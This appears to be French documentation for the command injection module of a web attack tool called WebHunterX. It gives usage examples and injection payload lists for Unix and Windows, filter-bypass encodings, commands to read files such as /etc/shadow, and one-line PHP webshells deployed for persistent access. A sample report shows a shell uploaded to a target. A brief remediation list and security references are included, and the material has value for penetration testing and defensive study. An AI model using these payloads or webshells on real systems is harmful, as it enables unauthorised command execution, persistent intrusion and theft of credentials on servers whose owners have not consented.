# Module Command Injection

Le module Command Injection (CMDi) de WebHunterX est un outil puissant pour détecter et exploiter les vulnérabilités d'injection de commandes système dans les applications web. Ce module permet de tester la sécurité des applications qui interagissent avec le système d'exploitation sous-jacent.

## Fonctionnalités principales

- **Détection multi-plateforme** : Support des systèmes Unix/Linux et Windows
- **Techniques variées** : Diverses méthodes d'injection adaptées aux cibles
- **Contournement de filtres** : Techniques avancées pour éviter les protections
- **Exploitation complète** : Extraction d'informations et exécution de commandes
- **Upload de webshells** : Possibilité de déployer des shells web persistants
- **Tests temporisés** : Détection par inférence de délai d'exécution

## Principes des vulnérabilités Command Injection

Les injections de commandes système se produisent lorsqu'une application web transmet des données contrôlées par l'utilisateur à un interpréteur de commandes système sans validation ou échappement adéquat. Ces vulnérabilités peuvent permettre l'exécution de commandes arbitraires sur le serveur hôte.

## Utilisation de base

```bash
# Analyse de base d'une URL
python webhunterx.py --module cmdi --url "https://exemple.com/ping?host=8.8.8.8"

# Ciblage d'un paramètre spécifique
python webhunterx.py --module cmdi --url "https://exemple.com/ping?host=8.8.8.8" --param host

# Analyse avec authentification
python webhunterx.py --module cmdi --url "https://exemple.com/ping?host=8.8.8.8" --cookies "PHPSESSID=abc123; auth=xyz789"

# Exploitation et upload de shell
python webhunterx.py --module cmdi --url "https://exemple.com/ping?host=8.8.8.8" --param host --shell
```

## Options spécifiques

| Option | Description |
|--------|-------------|
| `--param` | Paramètre spécifique à tester |
| `--os` | Système d'exploitation cible (unix, windows, auto) |
| `--technique` | Technique d'injection à utiliser (standard, blind, time) |
| `--cmd` | Commande personnalisée à exécuter |
| `--shell` | Tenter d'uploader un shell web |
| `--shell-path` | Chemin pour l'upload du shell |
| `--time-sec` | Délai en secondes pour les tests temporisés |
| `--prefix` | Préfixe personnalisé pour les payloads |
| `--suffix` | Suffixe personnalisé pour les payloads |

## Techniques d'injection

### Opérateurs de chaînage de commandes

Les opérateurs permettant de chaîner plusieurs commandes sont souvent utilisés pour les injections :

#### Unix/Linux

```bash
# Séparateurs de commandes
command1 ; command2         # Exécution séquentielle
command1 && command2        # Exécute command2 si command1 réussit
command1 || command2        # Exécute command2 si command1 échoue
command1 | command2         # Pipe: sortie de command1 en entrée de command2
$(command)                  # Substitution de commande
`command`                   # Substitution de commande (ancienne syntaxe)
```

#### Windows

```batch
command1 & command2         # Exécution séquentielle
command1 && command2        # Exécute command2 si command1 réussit
command1 || command2        # Exécute command2 si command1 échoue
command1 | command2         # Pipe: sortie de command1 en entrée de command2
```

### Techniques de contournement de filtres

#### Contournement par encodage

```bash
# Encodage URL
%0Aid                       # Encodage du saut de ligne (\n)
%0a%0did                    # Encodage du saut de ligne et retour chariot (\r\n)

# Encodage hexadécimal (Bash)
$'\x77\x68\x6f\x61\x6d\x69' # whoami

# Concaténation de variables (Bash)
c=cat;$c /etc/passwd
```

#### Séparateurs alternatifs

```bash
# Variables d'environnement et caractères spéciaux
${IFS}                      # Utilisation d'Internal Field Separator au lieu d'espace
X=$'cat\x20/etc/passwd'&&$X # Combinaison d'encodage et de variables
```

## Exemples de payloads

### Payloads de détection (Unix)

```bash
; id
& id
| id
$(id)
`id`
|| id
&& id
```

### Payloads de détection (Windows)

```cmd
& dir
| dir
|| dir
&& dir
; dir
```

### Payloads temporisés

Ces payloads sont utilisés pour détecter les injections en aveugle par inférence de temps :

```bash
# Unix
; sleep 5
& ping -c 5 127.0.0.1

# Windows
& ping -n 5 127.0.0.1
& timeout 5
```

## Exemple de rapport

Le module Command Injection génère des rapports détaillés dans différents formats :

```json
{
  "timestamp": "2023-07-02T10:32:18",
  "target": "https://exemple.com/ping?host=8.8.8.8",
  "vulnerabilities": [
    {
      "type": "COMMAND_INJECTION",
      "parameter": "host",
      "method": "GET",
      "os_detected": "unix",
      "technique": "standard",
      "payload": "8.8.8.8 & id",
      "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
      "severity": "critical",
      "commands_executed": {
        "System info": "Linux web-server 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64",
        "User info": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "Network info": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.1.5",
        "Files accessible": "total 80K -rw-r--r-- 1 root root 1.4K Oct 12 2019 index.php"
      },
      "shell_uploaded": {
        "success": true,
        "url": "https://exemple.com/tmp/shell.php",
        "test_cmd": "id"
      },
      "remediation": "Éviter d'utiliser des fonctions shell système avec des entrées utilisateur. Utiliser des API ou des bibliothèques sécurisées."
    }
  ],
  "scan_details": {
    "params_tested": 2,
    "payloads_sent": 24,
    "scan_duration": "00:01:45"
  }
}
```

## Architecture interne

Le module Command Injection est constitué de plusieurs composants :

1. **Détecteur d'injection** : Identifie les points vulnérables aux injections de commandes
2. **Analyseur d'OS** : Détermine le système d'exploitation cible
3. **Générateur de payloads** : Crée des payloads adaptés à l'OS et au contexte
4. **Moteur d'exploitation** : Exploite les vulnérabilités identifiées
5. **Uploadeur de shell** : Déploie des shells web pour un accès persistant
6. **Extracteur d'informations** : Collecte des informations sur le système cible
7. **Générateur de rapports** : Produit des rapports détaillés sur les vulnérabilités

## Exploitation de commandes système courantes

### Informations système (Unix/Linux)

```bash
# Informations utilisateur
id
whoami

# Informations système
uname -a
cat /etc/issue
cat /proc/version

# Réseau
ifconfig
ip addr
netstat -an

# Fichiers sensibles
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
```

### Informations système (Windows)

```cmd
# Informations utilisateur
whoami
echo %username%

# Informations système
systeminfo
ver

# Réseau
ipconfig /all
netstat -an

# Fichiers sensibles
type C:\Windows\win.ini
type C:\boot.ini
```

## Upload de shell web

Le module peut tenter d'uploader un shell web pour établir un accès persistant :

```bash
# Unix/Linux
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Windows
echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php
```

Ces shells peuvent ensuite être utilisés pour exécuter des commandes arbitraires :

```
https://exemple.com/shell.php?cmd=id
```

## Mitigation et bonnes pratiques

Le rapport inclut des recommandations de correction spécifiques :

1. **Éviter l'exécution de commandes système** : Utiliser des API ou des bibliothèques plutôt que des appels système
2. **Validation stricte des entrées** : Limiter les entrées à des caractères alphanumériques si possible
3. **Liste blanche de commandes** : N'autoriser que des commandes spécifiques et prédéfinies
4. **Isolation des environnements** : Utiliser des conteneurs ou des environnements isolés pour l'exécution
5. **Principe du moindre privilège** : Exécuter les applications web avec des utilisateurs aux privilèges limités

## Intégration avec d'autres modules

Le module Command Injection peut être utilisé avec d'autres modules de WebHunterX :

- **Module de crawling** : Pour découvrir automatiquement les points d'injection
- **Module d'authentification** : Pour tester les zones protégées
- **Module de fuzzing** : Pour tester des variations de payloads

## Références

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks Command Injection Guide](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) 